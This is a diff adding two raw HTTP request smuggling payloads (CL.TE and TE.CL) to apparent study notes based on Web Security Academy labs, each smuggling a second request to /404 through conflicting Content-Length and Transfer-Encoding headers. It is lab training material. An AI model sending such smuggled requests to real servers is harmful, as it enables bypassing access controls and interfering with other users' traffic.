@@ -405,6 +405,19 @@ The back-end relies on `Transfer-Encoding: chunked`.
 2. The back-end reads 0x00 (0) bytes, which means this is the end of the request
 3. The back-end now interprets the end of the request as a new request to /404
 
+###### Other example
+```
+POST / HTTP/1.1
+Host: 0a4d00d2030017ef81108fdd008e001a.web-security-academy.net
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
+
 ##### TE.CL
 ```
 POST / HTTP/1.1
@@ -433,6 +446,22 @@ The back-end relies on `Content-Length: 4`.
 1. The back-end 4 bytes, which is `3f\r\n`, then it is the end of the request
 2. The back-end reads its buffers and assumes a new request arrived by receiving GET /admin
 
+###### Other example
+```
+POST / HTTP/1.1
+Host: 0a86001a033d23d58098581000580080.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+2d
+POST /404 HTTP/1.1
+Content-Length: 15
+
+a=a
+0
+
+
+```
 
 #### Step 1 - Scan
 - Use the **Param Miner** (all options)
